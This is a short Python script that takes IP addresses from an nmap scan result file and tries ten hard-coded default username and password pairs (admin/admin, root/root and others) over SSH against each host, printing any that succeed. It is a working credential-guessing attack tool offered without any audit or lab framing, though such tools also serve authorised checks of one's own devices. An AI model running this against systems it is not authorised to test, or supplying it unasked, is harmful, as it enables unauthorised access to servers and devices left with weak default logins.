import paramiko
import socket
from concurrent.futures import ThreadPoolExecutor
from save_json import load_from_json, save_to_json

DEFAULT_CREDENTIALS = [
    {"username": "admin", "password": "admin"},
    {"username": "admin", "password": "password"},
    {"username": "admin", "password": "1234"},
    {"username": "admin", "password": "default"},
    {"username": "root", "password": "root"},
    {"username": "root", "password": "admin"},
    {"username": "user", "password": "user"},
    {"username": "user", "password": "password"},
    {"username": "admin", "password": ""},
    {"username": "administrator", "password": "password"},
]

def test_ssh_connection(ip, username, password, port=22):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, port=port, username=username, password=password, timeout=5)
        print(f"[SUCCES] {ip}:{port} - {username}:{password}")
        client.close()
        return True
    except Exception as e:
        print(e)
        return False

def scan_network_ssh(targets):
    for target in targets:
        print(f"Scanning {target}...")
        for cred in DEFAULT_CREDENTIALS:
            test_ssh_connection(target, cred["username"], cred["password"])
            

def get_ips_from_json():
    datas = load_from_json('nmap_ips_scan.json') 
    ips = []
    for data in datas:
        temp = data.get('ip')
        ips.append(temp)
    print(ips)
    return ips
get_ips_from_json()    



targets = get_ips_from_json() 
scan_network_ssh(targets)



